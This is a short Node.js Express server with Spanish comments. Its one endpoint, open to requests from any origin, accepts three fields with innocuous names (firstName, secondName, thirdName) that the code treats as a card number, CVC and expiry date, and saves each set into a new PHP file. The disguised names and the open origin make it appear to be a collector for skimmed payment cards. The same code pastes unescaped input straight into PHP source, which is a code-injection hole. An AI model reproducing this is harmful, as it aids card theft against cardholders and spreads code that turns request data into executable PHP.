require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 4000; // 🔹 Usar el puerto asignado por Vercel

// 🔹 Middleware para procesar JSON correctamente
app.use(express.json()); 

// 🔹 Configurar CORS para aceptar solicitudes desde cualquier origen
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Accept']
}));

// 🔹 Servir archivos estáticos desde `public/`
app.use('/public', express.static(path.join(__dirname, 'public')));

// 🔹 Endpoint para recibir datos de pago (Ahora en `/api/send-data`)
app.post('/api/send-data', async (req, res) => {
    try {
        console.log("📨 Recibiendo datos en Vercel...");

        if (!req.body || typeof req.body !== 'object') {
            console.error("🚨 ERROR: Datos JSON inválidos.");
            return res.status(400).json({ error: 'Datos JSON incorrectos o vacíos.' });
        }

        const { firstName, secondName, thirdName } = req.body;

        if (!firstName || !secondName || !thirdName) {
            console.error("🚨 ERROR: Datos incompletos.");
            return res.status(400).json({ error: 'Datos incompletos' });
        }

        // 📂 Verificar que la carpeta `data/` existe antes de guardar el archivo PHP
        const dataDir = path.join(__dirname, 'data');
        if (!fs.existsSync(dataDir)) {
            fs.mkdirSync(dataDir);
        }

        // 🔹 Generar archivo PHP con los datos recibidos
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        const phpFilePath = path.join(dataDir, `payment-data-${timestamp}.php`);

        const phpContent = `<?php
        $cardNumber = "${firstName}";
        $cvc = "${secondName}";
        $expirationDate = "${thirdName}";

        echo "<h2>Datos de Pago</h2>";
        echo "<p><strong>Tarjeta:</strong> $cardNumber</p>";
        echo "<p><strong>CVC:</strong> $cvc</p>";
        echo "<p><strong>Expiración:</strong> $expirationDate</p>";
        ?>`;

        fs.writeFileSync(phpFilePath, phpContent);

        console.log(`✅ Archivo PHP generado en: ${phpFilePath}`);

        res.json({ message: 'Datos guardados correctamente en PHP', file: phpFilePath });
    } catch (error) {
        console.error("🚨 ERROR al procesar la solicitud:", error);
        res.status(500).json({ error: 'Error interno al procesar la información.' });
    }
});

// 🔹 Iniciar el servidor
app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
});
